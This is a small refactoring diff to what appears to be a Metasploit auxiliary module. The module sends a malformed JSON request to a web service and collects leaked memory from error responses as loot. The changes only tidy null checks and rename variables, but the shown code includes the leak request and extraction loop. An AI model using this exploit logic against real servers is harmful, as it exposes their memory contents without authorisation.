@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path),
       'method' => 'GET'
     }
-    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if !datastore['USERNAME'].blank? || !datastore['PASSWORD'].blank?
+    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?
 
     res = send_request_cgi(request)
 
@@ -149,7 +149,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => 'application/json',
       'data' => "@\n"
     }
-    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if !datastore['USERNAME'].blank? || !datastore['PASSWORD'].blank?
+    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?
 
     res = send_request_cgi(request)
 
@@ -162,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
     leak1 = json_body.dig('error', 'root_cause')
-    return if leak1.nil? || leak1.empty?
+    return if leak1.blank?
 
     leak1 = leak1[0]['reason']
     return if leak1.nil?
@@ -178,11 +178,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    bleeded = ''
+    memory = ''
     1.upto(leak_count) do |count|
-      vprint_status("Leaking heartbeat response ##{count}")
-      bleeded << bleed
+      vprint_status("Leaking response ##{count}")
+      memory << bleed
     end
-    loot_and_report(bleeded)
+    loot_and_report(memory)
   end
 end
